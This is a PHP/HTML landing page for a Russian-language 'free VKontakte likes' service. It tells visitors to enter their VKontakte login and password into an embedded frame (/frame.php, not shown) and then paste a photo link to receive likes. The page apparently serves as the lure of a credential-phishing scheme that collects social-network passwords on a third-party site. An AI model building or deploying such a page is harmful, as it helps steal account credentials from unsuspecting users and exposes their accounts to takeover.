<?php 
@session_start();
include("bd.php");
if (($_COOKIE["auth_vk"] == "1")) {
   header("Location: index.php");
   exit;
}
?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Бесплатные лайки ВКонтакте</title>
      <link href="heart_9425.ico" rel="shortcut icon">
      <link href="css/bootstrap.min.css" rel="stylesheet">
      <link href="font-awesome/css/font-awesome.css" rel="stylesheet">
      <link href="css/plugins/iCheck/custom.css" rel="stylesheet">
      <link href="css/animate.css" rel="stylesheet">
      <link href="css/style.css" rel="stylesheet">
   </head>
   <body class="gray-bg">
      <div class="middle-box text-center loginscreen   animated fadeInDown" style="    width: 570px;    max-width: 900px;">
         <div>
            <div>
               <h1 class="logo-name" style="font-size: 73px;color:#5e81a8"> VK LIKE</h1><br>
            </div>
            <center>Добро пожаловать на сервис получения бесплатных лайков!
Инструкция:<br>
<br>
<center>
1. Авторизуемся через логин и пароль от "Вконтакте".<br>
2. Вставляем ссылку на фото<br>
3. Радуемся лайкам :)
</center>
<br>
<br>
<center>
<iframe frameborder="0" src="/frame.php" width="570" height="300" scrolling="no" style="overflow: hidden;"></iframe>
</center>
         </div>
      </div>
      <script src="js/jquery-2.1.1.js"></script>
      <script src="js/bootstrap.min.js"></script>
      <script src="js/mys.js"></script>
      <script src="js/plugins/iCheck/icheck.min.js"></script>
   </body>
</html>